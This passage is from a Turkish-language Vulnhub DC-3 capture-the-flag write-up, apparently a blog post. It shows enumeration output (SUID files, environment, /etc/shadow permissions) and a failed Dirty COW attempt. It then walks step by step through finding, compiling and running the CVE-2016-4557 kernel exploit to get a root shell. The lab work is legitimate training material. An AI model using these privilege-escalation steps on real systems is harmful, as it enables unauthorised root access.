+sshd❌111:65534::/var/run/sshd:/usr/sbin/nologin
+dc3❌1000:1000:dc3,,,:/home/dc3:/bin/bash
+
+<span style="color:#75715e">### ENVIRONMENTAL #######################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Environment information:
+APACHE_PID_FILE<span style="color:#f92672">=</span>/var/run/apache2/apache2.pid
+APACHE_RUN_USER<span style="color:#f92672">=</span>www-data
+PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOG_DIR<span style="color:#f92672">=</span>/var/log/apache2
+PWD<span style="color:#f92672">=</span>/tmp
+LANG<span style="color:#f92672">=</span>C
+APACHE_RUN_GROUP<span style="color:#f92672">=</span>www-data
+SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+APACHE_RUN_DIR<span style="color:#f92672">=</span>/var/run/apache2
+APACHE_LOCK_DIR<span style="color:#f92672">=</span>/var/lock/apache2
+_<span style="color:#f92672">=</span>/usr/bin/env
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Can we read/write sensitive files:
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1614</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/passwd
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">806</span> Apr <span style="color:#ae81ff">25</span> 16:26 /etc/group
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">575</span> Oct <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2015</span> /etc/profile
+-rw-r----- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">968</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/shadow
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SUID files:
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43316</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping6
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">157424</span> Mar <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /bin/ntfs-3g
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26492</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/umount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38900</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /bin/su
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30112</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /bin/fusermount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34812</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/mount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38932</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping
+-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">105004</span> Mar <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> /usr/lib/snapd/snap-confine
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13960</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38300</span> Mar  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2017</span> /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">513528</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">46436</span> Oct <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5480</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">53128</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/passwd
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgidmap
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">78012</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/gpasswd
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">159852</span> May <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> /usr/bin/sudo
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18216</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/bin/pkexec
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">39560</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chsh
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">48264</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/chfn
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newuidmap
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34680</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgrp
+-rwsr-sr-x <span style="color:#ae81ff">1</span> daemon daemon <span style="color:#ae81ff">50748</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2016</span> /usr/bin/at
+
+<span style="color:#75715e">### SCAN COMPLETE ####################################</span>
+</code></pre></div><p>Kernel sürümünün eski olduğu görülmektedir. İlk olarak Dirty-COW adı verilen zafiyet ile yetki yükseltilmeye çalışılmıştır. Ancak www-data kullanıcısı login işlemine kapalı olduğundan /etc/passwd üzerinde yapılan her değişiklikten sonra sistem crash olmuştur.</p>
+<p><em>Linux Kernel 4.4.x çekirdeğine sahip Ubuntu 16.x sisteminde “Linux Kernel 4.4.x (Ubuntu 16.04) – ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation” isimli CVE-2016-4557 ID’li kritik bir zafiyet bulunmaktadır.</em> Searchsploit üzerinde arama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit Linux Kernel 4.4.x
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel 4.4.x <span style="color:#f92672">(</span>Ubuntu 16.04<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;double-fdput()&#39;</span> bpf<span style="color:#f92672">(</span>BPF_PROG_LOAD<span style="color:#f92672">)</span> Privilege Escalat | linux/local/39772.txt
+</code></pre></div><p>Searchsploit üzerinden exploit bilgisayara indirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit -m <span style="color:#ae81ff">39772</span>
+</code></pre></div><p>İndirilen exploit dosyası localhosttan hedef makinaya indirilir. Daha sonra zip ve tar arşiv dosyaları çıkarılır.</p>
+<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -lsa
+ls -lsa
+total 28
+4 drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .
+4 drwxr-xr-x 4 www-data www-data 4096 Sep 29 08:29 ..
+4 -rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh
+8 -rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c
+4 -rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c
+4 -rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c
+www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
+./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)&quot;&quot;
+               ^
+</code></pre><p>Derleme sonucu oluşturulan binary dosyası çalıştırılarak yetki yükseltme işlemi tamamlanır.</p>
+<pre><code class="language-terminal" data-lang="terminal">www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
+./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
+cd /root
+root@DC-3:/root# ls
+ls
+the-flag.txt
+</code></pre>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/flag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+       
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://barcode91.github.io/tags/vulnhub/">Vulnhub</a></span><span class="tag"><a href="https://barcode91.github.io/tags/write-up/">write-up</a></span><span class="tag"><a href="https://barcode91.github.io/tags/joomla/">joomla</a></span><span class="tag"><a href="https://barcode91.github.io/tags/sqlinjection/">sqlinjection</a></span><span class="tag"><a href="https://barcode91.github.io/tags/sqlmap/">sqlmap</a></span><span class="tag"><a href="https://barcode91.github.io/tags/cve-2017-8917/">CVE-2017-8917</a></span><span class="tag"><a href="https://barcode91.github.io/tags/cve-2016-4557/">CVE-2016-4557</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1710 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-09-29 13:06 &#43;0300
+      </p>
+
+      
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=VULNHUB%20DC-3%20Write%20Up&amp;caption=VULNHUB%20DC-3%20Write%20Up&amp;canonicalUrl=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=VULNHUB%20DC-3%20Write%20Up&amp;body=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f&amp;media=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f;description=VULNHUB%20DC-3%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f&amp;title=VULNHUB%20DC-3%20Write%20Up&amp;summary=VULNHUB%20DC-3%20Write%20Up&amp;source=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f&amp;resubmit=true&amp;title=VULNHUB%20DC-3%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f;title=VULNHUB%20DC-3%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=VULNHUB%20DC-3%20Write%20Up%20https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f&amp;t=VULNHUB%20DC-3%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=VULNHUB%20DC-3%20Write%20Up&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvulnhub-dc-3-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h"></span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+
+          
+            <span class="button next">
+              <a href="https://barcode91.github.io/posts/2020/09/vulnhub-dc-2-write-up/">
+                <span class="button__text">VULNHUB DC-2 Write Up</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+      
+<script src="https://utteranc.es/client.js"
+repo="Barcode91/blog-files"
+issue-term="title"
+label="comments :speech_balloon:"
+theme="github-dark-orange"
+crossorigin="anonymous"
+async>
+</script>
+  
+     
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<a href="javascript:" id="return-to-top"><i class="icon-chevron-up"></i></a>
+
+
+<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://barcode91.github.io">Barcode</a></span>
+            
+            
+            <span> <a href="https://barcode91.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Theme made by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://barcode91.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+    
+        <script src="https://barcode91.github.io/js/scroll.js"></script>
+    
+
+
+    </body>
+</html>
